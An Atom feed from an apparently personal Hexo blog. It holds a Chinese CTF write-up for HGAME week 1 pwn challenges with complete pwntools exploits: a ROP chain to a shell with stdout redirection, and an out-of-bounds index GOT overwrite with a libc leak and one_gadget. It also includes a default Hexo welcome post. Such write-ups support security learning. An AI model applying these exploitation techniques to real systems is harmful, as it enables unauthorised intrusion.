<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>StarrySky</title>
  
  <subtitle>StarrySky</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-01-12T11:26:52.897Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>StarrySky</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>hgame_week1</title>
    <link href="http://example.com/2023/01/12/hgame-week1/"/>
    <id>http://example.com/2023/01/12/hgame-week1/</id>
    <published>2023-01-12T10:46:53.000Z</published>
    <updated>2023-01-12T11:26:52.897Z</updated>
    
    <content type="html"><![CDATA[<h2 id="easy-overflow"><a href="#easy-overflow" class="headerlink" title="easy_overflow"></a>easy_overflow</h2><p><strong>知识点：</strong>标准输出(close(1))和标准错误(close(2))，有shell但获得不了输出。可以通过exec 1&gt;&amp;0来把标准输出重定向到文件描述符0(标准输入)，这个文件默认是开启的。这样我们就可以看到输出了</p><p>exec有两个作用</p><ol><li>代替shell执行命令，区别是shell执行完之后会回到shell，而exec会直接退出。</li><li>文件重定向，也就是<code>exec 1&gt;&amp;0</code>这样将文件描述符为1的文件重定向到0上</li></ol><p><strong>思路</strong>：利用backdoor来getshell之后输入exec 1&gt;&amp;0进行文件重定向</p><p><strong>完整exp如下</strong></p><pre><code class="python">from pwn import *context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)file_name = &#39;./vuln&#39;li = lambda x : print(&#39;\x1b[01;38;5;214m&#39; + x + &#39;\x1b[0m&#39;)ll = lambda x : print(&#39;\x1b[01;38;5;1m&#39; + x + &#39;\x1b[0m&#39;)context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]debug = 1if debug:    r = remote(&#39;week-1.hgame.lwsec.cn&#39;,31793)else:    r = process(file_name)elf = ELF(file_name)def dbg():    gdb.attach(r)ret = 0x000000000040101abackdoor = 0x401176bin_sh = 0x402004system = 0x401060rdi = 0x0000000000401233read = 0x4011A8p1 = b&#39;a&#39; * (0x10 + 8) + p64(ret) + p64(rdi) + p64(bin_sh) + p64(system) + p64(read)r.sendline(p1)r.sendline(b&#39;exec 1&gt;&amp;0&#39;)r.interactive()</code></pre><h2 id="choose-the-seat"><a href="#choose-the-seat" class="headerlink" title="choose_the_seat"></a>choose_the_seat</h2><p><strong>分析：</strong></p><p>读入v0作为数组下标，对小于0时未做限制，因此可以利用数组向上覆盖任意地址内容或定位到任意地址来泄露地址</p><p>vuln函数最后exit（0）结束程序导致不能二次利用，所以第一步先将exit_got覆盖成vuln_addr使程序可以被二次利用</p><p>由于使用的下标是16*v0，则计算v0：（所求地址-seats地址）&#x2F;16</p><pre><code class="python">#将exit覆盖成vulnindex1 = (exit - seat) / 16r.sendlineafter(&#39;Here is the seat from 0 to 9, please choose one.&#39; , str(int(index1)))r.sendlineafter(&#39;please input your name\n&#39; , p64(vuln))</code></pre><p>linux自带ASLR地址随机化每次程序运行时函数地址都不同， 但是由于函数与libc之间的相对距离不变，所以可以间接通过泄露函数地址求libc地址</p><p>为了不影响程序的正常运行，这里选择泄露位于main函数中不会再被用到的setbuf</p><pre><code class="python">index2 = (setbuf - seat) / 16r.sendlineafter(&#39;Here is the seat from 0 to 9, please choose one.&#39; , str(int(index2)))r.sendlineafter(&#39;please input your name&#39; , &#39;&#39;)leak_addr = u64(r.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))li(&#39;leak_addr = &#39; + hex(leak_addr))</code></pre><p>用泄露的setbuf地址和相对位置计算libc地址</p><pre><code class="python">#leak_addr - libc = 0x8ba0alibc_base = leak_addr - 0x8ba0a</code></pre><p>接下来就是利用one_gadget来getshell了，还是选择exit位置将其覆盖成one_gadget，这样程序运行到结束就可以getshell了</p><p><strong>完整exp如下</strong></p><pre><code class="python">from pwn import *context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)file_name = &#39;./vuln&#39;li = lambda x : print(&#39;\x1b[01;38;5;214m&#39; + x + &#39;\x1b[0m&#39;)ll = lambda x : print(&#39;\x1b[01;38;5;1m&#39; + x + &#39;\x1b[0m&#39;)context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]debug = 1if debug:    r = remote(&#39;week-1.hgame.lwsec.cn&#39;,31205)else:    r = process(file_name)elf = ELF(file_name)def dbg():    gdb.attach(r)seat = 0x4040A0exit = 0x404040vuln = 0x4011D6setbuf = 0x404020index1 = (exit - seat) / 16r.sendlineafter(&#39;Here is the seat from 0 to 9, please choose one.&#39; , str(int(index1)))r.sendlineafter(&#39;please input your name\n&#39; , p64(vuln))index2 = (setbuf - seat) / 16r.sendlineafter(&#39;Here is the seat from 0 to 9, please choose one.&#39; , str(int(index2)))r.sendlineafter(&#39;please input your name&#39; , &#39;&#39;)leak_addr = u64(r.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))li(&#39;leak_addr = &#39; + hex(leak_addr))#leak_addr - libc = 0x8ba0alibc_base = leak_addr - 0x8ba0a                                                                                                                      one = [0xe3afe , 0xe3b01 , 0xe3b04]one_gadget = one[1] + libc_baser.sendlineafter(&#39;Here is the seat from 0 to 9, please choose one.&#39; , str(int(index1)))r.sendlineafter(&#39;please input your name&#39; , p64(one_gadget))r.interactive()</code></pre><h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><h2 id="simple-shellcode"><a href="#simple-shellcode" class="headerlink" title="simple_shellcode"></a>simple_shellcode</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;easy-overflow&quot;&gt;&lt;a href=&quot;#easy-overflow&quot; class=&quot;headerlink&quot; title=&quot;easy_overflow&quot;&gt;&lt;/a&gt;easy_overflow&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;知识点：&lt;/strong&gt;标准输出(</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2023/01/05/hello-world/"/>
    <id>http://example.com/2023/01/05/hello-world/</id>
    <published>2023-01-05T15:19:52.532Z</published>
    <updated>2022-11-20T07:41:56.505Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;</code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
